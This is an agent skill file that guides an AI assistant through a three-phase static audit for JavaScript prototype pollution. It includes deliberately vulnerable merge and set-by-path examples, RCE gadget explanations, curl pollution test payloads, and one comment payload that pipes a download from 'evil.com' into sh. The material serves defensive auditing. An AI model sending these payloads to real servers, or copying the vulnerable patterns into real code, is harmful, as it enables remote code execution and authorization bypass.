---
name: sast-prototype
description: >-
  Detect JavaScript/TypeScript prototype pollution vulnerabilities in a
  codebase using a three-phase approach: recon (find merge/assign/set sites
  that walk user-supplied keys), batched verify (trace user input and check
  for safe-key filtering in parallel subagents, 3 sites each), and merge
  (consolidate batch results). Covers `__proto__` / `constructor.prototype`
  key injection through unsafe deep-merge, `_.set`, manual recursive copy,
  minimist <1.2.6, qs with `allowPrototypes`, and gadget chains to RCE, auth
  bypass, and DoS. Requires sast/architecture.md (run sast-analysis first).
  Outputs findings to sast/prototype-results.md and sast/prototype-results.json.
  Use when asked to find prototype pollution, __proto__ injection, or unsafe
  deep-merge bugs.
version: 0.1.0
---

# Prototype Pollution Detection

You are performing a focused security assessment to find **prototype pollution** vulnerabilities in a JavaScript or TypeScript codebase. This skill uses a three-phase approach with subagents: **recon** (find merge/assign/set sites that copy user-supplied keys into an object), **batched verify** (trace whether attacker-controlled input reaches those sites in parallel batches of 3, and check for safe-key filtering), and **merge** (consolidate batch results into the final report).

**Prerequisites**: `sast/architecture.md` must exist. Run the analysis skill first if it doesn't.

Prototype pollution is a **critical-impact** class for JavaScript server-side code. A single polluted property on `Object.prototype` is inherited by every plain object in the process — including internal library defaults, option bags passed to the Node `child_process` family, `require()` resolution options, template engine `sourceURL`, Express/Passport internals, and countless other gadget surfaces. Exploitation chains regularly escalate from a single `__proto__` injection in a merge helper to RCE, authentication bypass, or denial of service.

---

## What is Prototype Pollution

Prototype pollution occurs when an attacker can cause the application to set a property on `Object.prototype` — or on the prototype of another widely-used built-in such as `Array.prototype` or `Function.prototype` — by feeding attacker-controlled keys through a function that walks a nested object and assigns into a target. The key insight: in JavaScript, `obj.__proto__` is an aliasing accessor for `Object.getPrototypeOf(obj)` on plain objects, and `obj.constructor.prototype` resolves to `Object.prototype` for every object literal. Any code path that does the moral equivalent of `target[key] = source[key]` where `key` comes from untrusted input, without filtering, is a candidate.

The three poisonous keys to remember:

- `__proto__` — direct accessor for the prototype of a plain object.
- `constructor` — combined with a nested `prototype` child key, reaches `Object.prototype` via `obj.constructor.prototype`.
- `prototype` — relevant when the target is a function (rare but real, e.g., polluting a class via a deep-merge into a function).

Once `Object.prototype.foo = bar` is set, **every** plain object in the process inherits `foo === bar` (unless the object was created with `Object.create(null)` or has its own `foo`). This is how a benign-looking bug in a user-profile update endpoint becomes RCE: somewhere downstream, a library reads `options.shell` or `options.stdio` or `options.sourceURL` off an option bag whose prototype has just been poisoned, and the attacker-controlled default takes effect.

Prototype pollution chains to three main consequences:

1. **Remote code execution** — via the Node `child_process` module where a polluted `options.shell` turns a safe-looking list invocation into shell execution; via `require()` options (`main`, `paths`); via template engines that eval a `sourceURL` property; via `vm` modules with polluted contexts.
2. **Authentication / authorization bypass** — middleware reads `user.isAdmin` or `session.role` from an object that falls back to a polluted prototype property; server-side feature flags default to `true` because the missing key now inherits a polluted value.
3. **Denial of service / logic corruption** — `JSON.stringify` recursing into polluted properties, iteration loops picking up unexpected keys, crypto libraries misbehaving when a polluted `length` or `0`/`1`/`2` numeric index appears.

### What Prototype Pollution IS

- Passing user-supplied nested JSON directly into `lodash.merge(target, userInput)`, `lodash.mergeWith`, `lodash.defaultsDeep`, `_.set(obj, userPath, userValue)`, or equivalent deep-copy helpers when `target` is a plain object and no safe-key filter is applied.
- Passing user-supplied nested input into `jQuery.extend(true, {}, userObj)` (deep-extend mode).
- Writing your own recursive merge/assign/clone that iterates keys with `for...in`, `Object.keys`, or `Object.entries` and recurses into nested objects without excluding `__proto__`, `constructor`, and `prototype`.
- Using `minimist` below 1.2.6 to parse CLI flags from attacker-influenced arguments.
- Using `qs` with `allowPrototypes: true` (or any config that reaches that option) to parse query strings.
- Express 4 default body parsers piped into unsafe merge helpers — especially `req.body`, `req.query`, and `req.params` being spread or merged into config objects.
- Walking a parsed JSON tree via `JSON.parse(userInput)` and then manually assigning `target[key] = source[key]` recursively without key filtering.
- Using `Object.assign` in a loop over user-supplied keys where one of the source values is itself an attacker-controlled object (shallow assign is usually fine at the top level, but becomes unsafe when combined with deep iteration).
- Setting properties by path string (`setByPath(obj, "a.b.c", val)`) where the path originates from user input and contains `__proto__` in a segment.

### What Prototype Pollution is NOT

Do not flag these as prototype pollution:

- **Map vs. object differences**: if the target is a `Map` (`new Map()`), `set`/`get` operations never touch `Object.prototype` — they use an internal hash table. Flag only plain objects and `{}` literals.
- **`Object.create(null)` targets**: objects created with `null` prototype have no `__proto__` accessor at all; merging into them cannot pollute `Object.prototype`. They are the canonical safe target.
- **Shallow `Object.assign(target, source)` at the top level**: writing `target.__proto__ = source.__proto__` via `Object.assign` only copies own enumerable properties, and `__proto__` in `source` is a getter/setter rather than an own property for plain literals in most cases. Deep merges are the risk.
- **Spread (`...`) at the top level**: `{ ...userObj }` copies own enumerable string-keyed properties; `__proto__` as a literal key in JSON *will* be set as own, but as the top-level *new* object's prototype, not `Object.prototype` of everything else. Risk exists mainly when the spread result is then deep-merged elsewhere.
- **`JSON.parse(userInput)` alone**: parsing user JSON into a local variable does not pollute anything — the result is a plain object. The risk is what the code does with that parsed object next (merge, assign, set-by-path).
- **Reading from a request, then validating with a schema**: if the code validates with Ajv (strict mode), Joi, Zod, or a similar schema validator *before* merging, the dangerous keys should have been rejected. Check that strict/additional-property settings are enabled.
- **TypeScript type assertions**: `as Record<string, unknown>` casts are a static type system concern only; they do nothing at runtime and neither cause nor prevent pollution.
- **Client-side DOM code only**: browser-side prototype pollution is a different (usually lower-severity) threat model; this skill focuses on Node.js server-side code. Flag client code separately if relevant, but do not conflate it with server RCE gadget chains.

### Patterns That Prevent Prototype Pollution

When you see these patterns, the code is likely **not vulnerable**. During Phase 2 verification, look for them:

**1. `Object.create(null)` as the merge target**

```javascript
// SAFE: null-prototype object has no __proto__, no constructor — pollution is impossible
const target = Object.create(null);
deepMerge(target, userInput);
```

**2. `Map` instead of plain object**

```javascript
// SAFE: Map stores keys internally, never touches Object.prototype
const opts = new Map();
for (const [key, value] of Object.entries(userInput)) {
  opts.set(key, value);
}
```

**3. Explicit `hasOwnProperty` / `Object.hasOwn` filtering in a merge loop**

```javascript
// SAFE (if combined with blocklist): loops only own enumerable keys, excludes dangerous keys
const DANGEROUS = new Set(["__proto__", "constructor", "prototype"]);
for (const key of Object.keys(source)) {
  if (DANGEROUS.has(key)) continue;
  if (!Object.hasOwn(source, key)) continue;
  target[key] = source[key];
}
```

Note: `Object.keys` already returns only own enumerable string keys, so `__proto__` as an accessor is usually excluded — but JSON-parsed objects can contain `__proto__` as an **own** property, which `Object.keys` *does* return. The explicit blocklist is what makes this safe.

**4. Safe-merge libraries**

- `deepmerge` (the npm package, not lodash.merge) with `clone: true` and default options explicitly skips `__proto__` and `constructor`.
- `@fastify/deepmerge` — safe by design.
- `defu` — safe by design, skips dangerous keys.
- `merge-options` with `{ concatArrays: false }` and default config — safe.

**5. Schema validators that reject unknown keys**

```javascript
// Ajv strict mode
const ajv = new Ajv({ allErrors: true, removeAdditional: "all", strict: true });
const schema = { type: "object", properties: { name: { type: "string" } }, additionalProperties: false };
const validate = ajv.compile(schema);
if (!validate(userInput)) return res.status(400).json(validate.errors);
// userInput now contains only known properties — no __proto__, no constructor

// Joi
const schema = Joi.object({ name: Joi.string() }).unknown(false);
const { error, value } = schema.validate(userInput);

// Zod — .strict() rejects unknown keys
const schema = z.object({ name: z.string() }).strict();
const parsed = schema.parse(userInput); // throws on unknown key including __proto__
```

**6. `JSON.parse` reviver that rejects poisonous keys**

```javascript
// SAFE: reviver returns undefined for any __proto__ / constructor / prototype key,
// which causes JSON.parse to omit the property entirely
function safeParse(json) {
  return JSON.parse(json, (key, value) => {
    if (key === "__proto__" || key === "constructor" || key === "prototype") return undefined;
    return value;
  });
}
```

**7. Node.js `--disable-proto=delete` flag**

```bash
# At process startup — removes Object.prototype.__proto__ accessor entirely
node --disable-proto=delete app.js
```

With this flag, setting `obj.__proto__` via the accessor no longer walks up the chain — the accessor simply doesn't exist. Note that `constructor.prototype` paths are still reachable, so this is a defense-in-depth layer, not a complete fix.

**8. `Object.freeze(Object.prototype)` at boot**

```javascript
// Defense in depth: freezes Object.prototype so no property can be added
Object.freeze(Object.prototype);
```

Works, but breaks some legitimate libraries that monkey-patch `Object.prototype`. Rarely seen in production but is a strong signal when present.

---

## Vulnerable vs. Secure Examples

### Unsafe deep-merge with lodash

```javascript
// VULNERABLE: lodash.merge / lodash.mergeWith deep-copies user keys into a plain object.
// Lodash pre-4.17.11 is known CVE-2018-16487 / 2019-10744.
// Even current versions copy __proto__ under certain nested shapes when the target is {}.
const _ = require("lodash");

app.post("/profile", (req, res) => {
  const defaults = { theme: "light", notifications: true };
  const profile = _.merge(defaults, req.body);   // req.body = { "__proto__": { "isAdmin": true } }
  saveProfile(profile);
  res.json(profile);
});

// VULNERABLE: _.defaultsDeep has the same root cause
const config = _.defaultsDeep({}, req.body, systemDefaults);

// VULNERABLE: _.set with a user-supplied path — __proto__.isAdmin as a path segment pollutes
_.set(target, req.body.path, req.body.value);
// path = "__proto__.isAdmin", value = true

// SAFE: explicit schema + Object.create(null) target
const schema = z.object({ theme: z.enum(["light", "dark"]), notifications: z.boolean() }).strict();
const parsed = schema.parse(req.body);
const profile = Object.assign(Object.create(null), defaults, parsed);
```

### jQuery.extend(true, ...) — deep extend

```javascript
// VULNERABLE: jQuery.extend in deep mode copies __proto__ keys from user input.
// This is historical CVE-2019-11358.
const merged = $.extend(true, {}, defaults, userOptions);

// SAFE: use jQuery.extend in shallow mode (still risky if user keys are unusual),
// or switch to a schema-validated object.
```

### Manual recursive merge

```javascript
// VULNERABLE: classic home-grown deep merge — no key filter
function deepMerge(target, source) {
  for (const key in source) {
    if (typeof source[key] === "object" && source[key] !== null) {
      if (!target[key]) target[key] = {};
      deepMerge(target[key], source[key]); // recurses into __proto__ if present as own
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

app.post("/settings", (req, res) => {
  const settings = deepMerge({}, req.body); // pollution via req.body.__proto__
});

// VULNERABLE variant — for...in iterates inherited props too; still polluted via own __proto__
function merge(a, b) {
  for (const k in b) {
    a[k] = (typeof b[k] === "object") ? merge(a[k] || {}, b[k]) : b[k];
  }
  return a;
}

// SAFE: explicit key allowlist
const ALLOWED = new Set(["theme", "language", "timezone"]);
function safeMerge(target, source) {
  for (const key of Object.keys(source)) {
    if (!ALLOWED.has(key)) continue;
    target[key] = source[key];
  }
  return target;
}
```

### set-by-path helpers

```javascript
// VULNERABLE: splits a dotted path and walks into the object creating missing parents
function setByPath(obj, path, value) {
  const parts = path.split(".");
  let cur = obj;
  for (let i = 0; i < parts.length - 1; i++) {
    if (!cur[parts[i]]) cur[parts[i]] = {};
    cur = cur[parts[i]];
  }
  cur[parts[parts.length - 1]] = value;
}

app.post("/config", (req, res) => {
  setByPath(appConfig, req.body.path, req.body.value);
  // path = "__proto__.shell", value = "/bin/sh -c 'curl evil.com | sh'"
});

// SAFE: reject dangerous path segments
const BLOCKED = new Set(["__proto__", "constructor", "prototype"]);
function safeSetByPath(obj, path, value) {
  const parts = path.split(".");
  if (parts.some(p => BLOCKED.has(p))) throw new Error("Invalid path");
  // ... same walk
}
```

### minimist < 1.2.6

```javascript
// VULNERABLE: CVE-2021-44906. User-controlled argv parses into polluted prototype.
const argv = require("minimist")(process.argv.slice(2));
// Attacker-influenced invocation: node app.js --__proto__.polluted=true

// SAFE: upgrade to minimist >= 1.2.6, which added __proto__ blocking
```

### qs parser with allowPrototypes

```javascript
// VULNERABLE: qs with allowPrototypes: true permits __proto__ keys in query strings.
// Express 4 mounts qs by default for req.query — audit any custom config.
const qs = require("qs");
const parsed = qs.parse(req.url.split("?")[1], { allowPrototypes: true });
// ?__proto__[isAdmin]=true  →  pollutes Object.prototype.isAdmin

// SAFE: leave allowPrototypes at its default (false)
const parsed = qs.parse(req.url.split("?")[1]); // default rejects __proto__ keys

// Related: Express middleware chains where req.query / req.body flows into lodash.merge
// are the most common real-world trigger.
```

### Express middleware — req.body into merge

```javascript
// VULNERABLE: body-parser accepts arbitrary nested JSON; downstream merge pollutes global state
const express = require("express");
const bodyParser = require("body-parser");
const _ = require("lodash");

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true })); // qs parser, nested objects

const globalConfig = {};
app.post("/update-config", (req, res) => {
  _.merge(globalConfig, req.body);
  res.json({ ok: true });
});

// Downstream: a library call later in the request lifecycle uses `{}` options,
// whose shell property now inherits from the polluted prototype — turning a
// listform child-process invocation into a shell invocation.
```

### Template engine sourceURL gadget

```javascript
// VULNERABLE: lodash.template, pug, handlebars — several have sourceURL/compiler gadgets
// that, when polluted, cause eval of attacker-controlled strings during compile.
const _ = require("lodash");
_.merge({}, req.body); // pollutes Object.prototype.sourceURL = "); malicious()//"
_.template("<%= foo %>")({ foo: "bar" });
// The compiled source includes the polluted sourceURL → arbitrary JS at template compile time
```

### Node child-process option-bag gadget

```javascript
// VULNERABLE (server RCE gadget after pollution):
// Once Object.prototype.shell = "/bin/sh" is set, this call goes through a shell.
// Once Object.prototype.env = { PATH: "/evil" } is set, the child runs attacker binaries.
const cp = require("child_process");
cp.execFile("ls", (err, stdout) => res.send(stdout));

// The {} default options bag here inherits `shell` from Object.prototype post-pollution.
// spawn / fork / execFile / the sync variants all share the same option-bag gadget surface.
// require() also accepts options with "paths" and "main" — polluted prototype can redirect
// module resolution in some gadget chains.
```

### Safe alternatives

```javascript
// SAFE: deepmerge package (not lodash.merge) — by default filters __proto__, constructor, prototype.
const deepmerge = require("deepmerge");
const merged = deepmerge(defaults, userInput, { clone: true });

// SAFE: structured clone — no prototype chain copying, only structured data
const clone = structuredClone(userInput);

// SAFE: JSON round-trip with reviver rejecting poisonous keys
const safe = JSON.parse(JSON.stringify(userInput), (k, v) =>
  (k === "__proto__" || k === "constructor" || k === "prototype") ? undefined : v
);

// SAFE: Zod / Joi / Ajv strict schema before any merge
const schema = z.object({ name: z.string(), age: z.number() }).strict();
const parsed = schema.parse(userInput); // throws on __proto__
Object.assign(config, parsed);
```

---

## Execution

This skill runs in three phases using subagents. Pass the contents of `sast/architecture.md` to all subagents as context, plus a note that the focus is Node.js / JavaScript / TypeScript server code.

### Phase 1: Recon — Find Merge/Assign/Set Sites with User Input

Launch a subagent with the following instructions:

> **Goal**: Find every location in the codebase where one object's properties are copied into another using a function that walks nested keys, *and* where the source object might include attacker-controlled keys. Flag ANY dynamic merge/set/assign site whose source is a function parameter, module-external value, or otherwise not a literal — Phase 2 will decide whether the source is actually user-controlled. Write results to `sast/prototype-recon.md`.
>
> **Context**: You will be given the project's architecture summary. Use it to understand the web framework (Express, Fastify, Koa, Next.js API routes, NestJS, etc.), the body parser in use, whether TypeScript schemas exist, and whether lodash / deepmerge / defu / merge-options are in dependencies.
>
> ---
>
> **Category 1 — lodash merge/assign/set family**
>
> Flag every call where one argument is a plain object and the other is non-literal:
>
> - `_.merge(target, source)` / `lodash.merge(...)`
> - `_.mergeWith(target, source, customizer)`
> - `_.defaultsDeep(target, ...sources)`
> - `_.assign(...)` / `_.assignIn(...)` — lower risk but still flag when nested
> - `_.set(obj, path, value)` / `_.setWith(...)` — flag if `path` is dynamic
> - `_.update(obj, path, updater)` — flag if `path` is dynamic
> - `_.zipObjectDeep(paths, values)` — flag if `paths` is dynamic
> - Any re-export from `lodash/fp`, `lodash-es`, individual imports like `require("lodash.merge")`.
>
> **Category 2 — jQuery-style deep extend**
>
> - `$.extend(true, target, ...sources)` or `jQuery.extend(true, ...)` with the `true` deep flag.
> - `Object.assign` is *not* deep — do not flag unless combined with a recursive walk.
>
> **Category 3 — Manual recursive merge/assign/clone**
>
> Search for patterns like:
>
> - `for (const key in source)` or `for (let key in source)` followed by `target[key] = ...` where the RHS recurses or directly assigns.
> - `Object.keys(source).forEach(k => target[k] = ...)` within a recursive function.
> - `function deepMerge`, `function deepAssign`, `function mergeDeep`, `function assignDeep`, `function extend`, `function clone`, `function copy` — inspect bodies for unfiltered key walks.
> - `function setByPath`, `function setPath`, `function setIn`, `function set`, `function update` — any helper that splits a dotted/path-array string and walks into the target.
>
> **Category 4 — minimist, qs, and other parsers with pollution history**
>
> - `require("minimist")(...)` — flag if present; note the version from `package.json` if visible. Versions <1.2.6 are vulnerable by default.
> - `require("qs").parse(..., { allowPrototypes: true })` — flag always.
> - Express `app.use(express.urlencoded({ extended: true }))` or `bodyParser.urlencoded({ extended: true })` — note it but do not flag alone; the pollution risk arises when `req.body` is then merged.
> - `yargs-parser` <13.1.2, `dottie`, `dot-prop` older versions — flag and note version if detectable.
>
> **Category 5 — JSON.parse followed by manual walk**
>
> - `JSON.parse(userInput)` whose result is subsequently iterated and copied into a plain object without a `__proto__`/`constructor` filter.
> - `JSON.parse(str, reviver)` where the reviver does *not* reject poisonous keys — flag.
>
> **Category 6 — Config loaders and option bags**
>
> Any helper that reads user/tenant/org configuration from a database, file, or request and deep-merges it into a global / module-level / process-wide defaults object. These often run at boot or on hot reload and pollute the entire process.
>
> ---
>
> **What to skip** (safe, do not flag):
>
> - Top-level `Object.assign(target, source)` without a deep walk.
> - Spread at top level (`{ ...source }`) without a deep walk.
> - Target is `Object.create(null)` or `new Map()`.
> - The merge is guarded by `schema.parse`, `ajv.validate`, `Joi.validate` with `additionalProperties: false` / `.strict()` / `.unknown(false)` *before* the merge.
> - The helper explicitly filters `__proto__`, `constructor`, and `prototype`.
> - The library is a known-safe deep merger: `deepmerge`, `@fastify/deepmerge`, `defu`, `merge-options` (with default config).
>
> ---
>
> **Output format** — write to `sast/prototype-recon.md`:
>
> ```markdown
> # Prototype Pollution Recon: [Project Name]
>
> ## Summary
> Found [N] potential prototype pollution sites: [A] lodash-family, [B] jQuery.extend, [C] manual recursive, [D] parser config, [E] JSON-parse walks, [F] config loaders.
>
> ## Sites Found
>
> ### 1. [Descriptive name — e.g., "lodash.merge of req.body into global config"]
> - **File**: `path/to/file.ts` (lines X-Y)
> - **Function / endpoint**: [route handler, function name, or module top-level]
> - **Category**: [lodash / jQuery / manual / parser / json-walk / config-loader]
> - **Sink**: [the exact merge/assign/set call]
> - **Source expression**: [the expression producing the source object — e.g., `req.body`, `JSON.parse(file)`, `parseQueryString(req.url)`]
> - **Target expression**: [the target — e.g., `{}`, `globalConfig`, `Object.create(null)` (safe!), `new Map()` (safe!)]
> - **Code snippet**:
>   ```
>   [5-15 lines of surrounding code]
>   ```
>
> [Repeat for each site]
> ```

### After Phase 1: Check for Candidates Before Proceeding

After Phase 1 completes, read `sast/prototype-recon.md`. If the recon found **zero sites** (the summary reports "Found 0" or the "Sites Found" section is empty or absent), **skip Phase 2 and Phase 3 entirely**. Instead, write the following content to `sast/prototype-results.md`, write an empty-findings JSON to `sast/prototype-results.json`, **delete** `sast/prototype-recon.md`, and stop:

```markdown
# Prototype Pollution Analysis Results

No vulnerabilities found.
```

```json
{ "findings": [] }
```

Only proceed to Phase 2 if Phase 1 found at least one potential site.

### Phase 2: Verify — Taint Analysis (Batched)

After Phase 1 completes, read `sast/prototype-recon.md` and split the sites into **batches of up to 3 sites each** (numbered sections under `## Sites Found`: `### 1.`, `### 2.`, etc.). Launch **one subagent per batch in parallel**. Each subagent traces taint only for its assigned sites and writes results to its own batch file.

**Batching procedure** (you, the orchestrator, do this — not a subagent):

1. Read `sast/prototype-recon.md` and count the numbered site sections.
2. Divide them into batches of up to 3. For example, 7 sites → 3 batches (1-3, 4-6, 7).
3. For each batch, extract the full text of those site sections from the recon file.
4. Launch all batch subagents **in parallel**, passing each one only its assigned sites.
5. Each subagent writes to `sast/prototype-batch-N.md` where N is the 1-based batch number.

Give each batch subagent these instructions (substitute batch-specific values):

> **Goal**: For each assigned site, determine whether a user-supplied value with attacker-controlled keys can reach the merge/assign/set call, *and* whether any safe-key filter or schema validation intercepts the flow before the sink. Write results to `sast/prototype-batch-[N].md`.
>
> **Your assigned sites**:
>
> [Paste the full text of the assigned site sections here, preserving the original numbering]
>
> **Context**: You will be given the project's architecture summary. Use it to understand request entry points, middleware, body parsers, and any schema/validation layer.
>
> **For each site, answer**:
>
> 1. **Is the source object attacker-controlled?** Trace the source expression backwards:
>    - HTTP request body: `req.body`, `ctx.request.body`, `request.body`, `@Body()` in NestJS.
>    - Query string: `req.query`, `ctx.query`, `URL.searchParams` iterated into an object.
>    - Path parameters: `req.params`, `ctx.params`.
>    - Headers / cookies: `req.headers`, `req.cookies`.
>    - File uploads: parsed JSON / YAML / form-data content.
>    - Database rows that originated as user input (second-order — still exploitable).
>    - Message queue / WebSocket payloads.
>    - CLI argv when invoked with attacker influence.
>
> 2. **Is there a schema/validator between the entry point and the sink?**
>    - Ajv with `additionalProperties: false` and strict mode — effective.
>    - Joi with `.unknown(false)` — effective.
>    - Zod with `.strict()` or `z.object({...}).strict()` — effective.
>    - `class-validator` (NestJS) with `whitelist: true` and `forbidNonWhitelisted: true` on `ValidationPipe` — effective.
>    - Manual key allowlist in the merge helper — effective if complete.
>    - Type-only TypeScript casts (`as Config`) — **not** effective (no runtime check).
>    - Truthy/property-existence checks (`if (req.body.name)`) — **not** effective against pollution.
>
> 3. **Does the sink filter `__proto__` / `constructor` / `prototype`?**
>    - Explicit blocklist or `Object.hasOwn` + blocklist in the merge body — effective.
>    - `Object.create(null)` target — effective.
>    - `Map` target — effective.
>    - `deepmerge` / `defu` / `@fastify/deepmerge` — safe by default.
>    - `lodash.merge` / `lodash.defaultsDeep` / `lodash.set` — **not** effective.
>
> 4. **If pollution is possible, what gadgets are reachable?**
>    - Look for Node `child_process` family calls (`spawn`, `fork`, `execFile`, and sync variants) that accept an option bag defaulting to `{}` — a polluted `shell` / `env` / `cwd` / `stdio` on that default bag is the classic RCE chain.
>    - Look for authorization checks like `if (user.isAdmin)` or `if (session.role === "admin")` on objects that may inherit polluted defaults.
>    - Look for template engines (`lodash.template`, `handlebars`, `pug`, `ejs`, `dust`) that may read polluted compile options.
>    - Look for `require(var)` with dynamic module paths whose options bag is polluted.
>    - Look for feature flags or rate-limit defaults derived from `{ ...defaults, ...user }` patterns.
>    - Note: if you cannot identify a specific gadget, pollution is still a finding — the impact is often proven by the next vulnerability analyst, not by this skill.
>
> **Classification**:
>
> - **Vulnerable** — attacker-controlled nested input demonstrably reaches an unsafe merge/assign/set and no filter blocks `__proto__` / `constructor` / `prototype`. Include any identifiable gadget chain.
> - **Likely Vulnerable** — user input reaches the sink through indirect flow or weak/partial mitigation (e.g., a key allowlist that could be incomplete, or a schema without strict mode confirmed).
> - **Not Vulnerable** — target is `Object.create(null)` / `Map`, OR a strict schema validation precedes the merge, OR the source is provably server-controlled, OR the merge library is safe-by-default.
> - **Needs Manual Review** — source origin unclear, or schema configuration cannot be confirmed from the available code.
>
> **Output format** — write to `sast/prototype-batch-[N].md`:
>
> ```markdown
> # Prototype Pollution Batch [N] Results
>
> ## Findings
>
> ### [VULNERABLE] Descriptive name
> - **File**: `path/to/file.ts` (lines X-Y)
> - **Endpoint / function**: [route or function]
> - **Sink**: [exact call, e.g., `_.merge(config, req.body)`]
> - **Source origin**: [entry point trace — e.g., `POST /api/settings → req.body → _.merge`]
> - **Validation between source and sink**: [none / partial / full — describe]
> - **Poisonous keys reachable**: [`__proto__` / `constructor` / `prototype` — which are reachable]
> - **Gadget chain**: [identified downstream gadget, e.g., "child-process option-bag shell → RCE" / "session.isAdmin inheritance → auth bypass" / "template sourceURL → RCE" / "no specific gadget identified, generic prototype pollution"]
> - **Impact**: [RCE / auth bypass / DoS / logic corruption — be specific]
> - **Remediation**: [switch to deepmerge/defu, use Object.create(null) target, enforce Zod/Ajv strict schema, drop _.set with user paths, etc.]
> - **Dynamic Test**:
>   ```
>   [curl / HTTPie payload to confirm pollution, e.g.:
>    curl -X POST https://app.example.com/settings \
>      -H "Content-Type: application/json" \
>      -d '{"__proto__": {"isAdmin": true, "shell": "/bin/sh"}}'
>    Then trigger the gadget path and observe.]
>   ```
>
> ### [LIKELY VULNERABLE] Descriptive name
> - [same fields, with the uncertainty called out in "Concern"]
>
> ### [NOT VULNERABLE] Descriptive name
> - **File**: `path/to/file.ts` (lines X-Y)
> - **Reason**: [e.g., "Target is Object.create(null)" / "Zod .strict() validation precedes merge" / "deepmerge package is used, not lodash"]
>
> ### [NEEDS MANUAL REVIEW] Descriptive name
> - **File**: `path/to/file.ts` (lines X-Y)
> - **Uncertainty**: [what could not be determined]
> - **Suggestion**: [what to check manually]
> ```

### Phase 3: Merge — Consolidate Batch Results

After **all** Phase 2 batch subagents complete, read every `sast/prototype-batch-*.md` file and merge them into `sast/prototype-results.md` plus the canonical `sast/prototype-results.json`. You (the orchestrator) do this directly — no subagent needed.

**Merge procedure**:

1. Read all `sast/prototype-batch-1.md`, `sast/prototype-batch-2.md`, ... files.
2. Collect every finding, preserving original classification and detail fields.
3. Count totals across all batches for the executive summary.
4. Write the merged Markdown report to `sast/prototype-results.md`.
5. Write the canonical JSON view to `sast/prototype-results.json` — one object per finding.
6. Delete all intermediate batch files (`sast/prototype-batch-*.md`) and the recon file (`sast/prototype-recon.md`).

**Markdown format** (`sast/prototype-results.md`):

```markdown
# Prototype Pollution Analysis Results: [Project Name]

## Executive Summary
- Sites analyzed: [total across all batches]
- Vulnerable: [N]
- Likely Vulnerable: [N]
- Not Vulnerable: [N]
- Needs Manual Review: [N]

## Findings

[All findings from all batches, grouped by classification:
 VULNERABLE first, then LIKELY VULNERABLE, then NEEDS MANUAL REVIEW, then NOT VULNERABLE.
 Preserve every field from the batch results exactly as written.]
```

**JSON format** (`sast/prototype-results.json`) — one object per finding, matching the canonical SAST schema:

```json
{
  "findings": [
    {
      "id": "prototype-1",
      "skill": "sast-prototype",
      "severity": "critical",
      "title": "lodash.merge of req.body into global config object",
      "description": "POST /api/settings passes req.body directly into _.merge(globalConfig, req.body). A nested __proto__ key in the request body pollutes Object.prototype process-wide, reachable to the downstream child-process call in /jobs/run which relies on the default {} options bag.",
      "location": { "file": "src/routes/settings.ts", "line": 42, "column": 7 },
      "remediation": "Validate req.body with a Zod .strict() schema before merging, or switch to the deepmerge package whose default configuration filters __proto__/constructor/prototype. Prefer Object.create(null) as the merge target for configuration objects."
    }
  ]
}
```

Severity guidance for prototype pollution:

- **critical** — attacker-controlled pollution reaches a confirmed RCE gadget (Node child-process default option bag, template engine `sourceURL`, `require()` option bag) or an authentication/authorization gadget (`isAdmin`, role checks).
- **high** — pollution is reachable but no specific high-severity gadget is identified yet. Generic `Object.prototype` pollution in a Node.js server is still high — defaults across the whole process are now attacker-influenced.
- **medium** — pollution is possible but mitigations are partial (a key allowlist that looks complete but is not provably so, or a schema without confirmed strict mode), or the input comes from an authenticated administrative flow.
- **low** — prototype pollution in a short-lived CLI / build-time script with no downstream gadget, or client-side only.

If a site was classified Not Vulnerable, include it in the Markdown report but not in the JSON findings array (the JSON is for actionable findings only). If there are zero findings, still write `{ "findings": [] }` so the exporter can confirm the scan ran.

---

## Findings

The final outputs of this skill are:

- `sast/prototype-results.md` — human-readable report, grouped by classification.
- `sast/prototype-results.json` — canonical machine-readable view for the SAST aggregator / SARIF exporter.

After writing both, clean up:

- `sast/prototype-recon.md` — delete.
- `sast/prototype-batch-*.md` — delete all.

---

## Important Reminders

- Read `sast/architecture.md` and pass its content to all subagents as context.
- Phase 2 must run AFTER Phase 1 completes — it depends on the recon output.
- Phase 3 must run AFTER all Phase 2 batches complete — it depends on all batch outputs.
- Batch size is **3 sites per subagent**. If there are 1-3 sites total, use a single subagent. If there are 10, use 4 subagents (3+3+3+1).
- Launch all batch subagents **in parallel** — do not run them sequentially.
- **Phase 1 is structural**: flag any merge/assign/set site whose source is not a compile-time literal, regardless of whether user input clearly reaches it. Phase 2 decides exploitability.
- **Phase 2 is the taint + mitigation pass**: trace the source back to a request / file / queue / CLI entry point, and verify whether a strict schema or a safe target/library intercepts the dangerous keys.
- **The three poisonous keys are `__proto__`, `constructor`, and `prototype`** — all three must be blocked for a filter to be effective. A filter that only rejects `__proto__` is bypassable via `constructor.prototype`.
- **`Object.create(null)` and `Map` are the canonical safe targets** — when you see them, pollution of the global `Object.prototype` through that merge is not possible.
- **Safe-by-default libraries**: `deepmerge` (npm), `@fastify/deepmerge`, `defu`, and `merge-options` (with default config) filter poisonous keys automatically. `lodash.merge`, `lodash.mergeWith`, `lodash.defaultsDeep`, `lodash.set`, and `jQuery.extend(true, ...)` do not.
- **Server-side gadgets are what makes this critical**: Node child-process default option bags, `require(path, options)` resolution options, template engine `sourceURL`, `vm` module contexts, Passport / Express middleware reading defaults, and rate-limit / feature-flag lookups are the classic chain targets.
- **TypeScript types do not prevent pollution** — `as Config` is a compile-time cast only. Runtime validation (Zod, Ajv, Joi, class-validator) is required.
- **When in doubt, classify as "Needs Manual Review"** rather than "Not Vulnerable". Prototype pollution has surprising reachability — a false negative can hide an RCE chain.
- **Clean up intermediate files**: delete `sast/prototype-recon.md` and all `sast/prototype-batch-*.md` files after writing the final results.
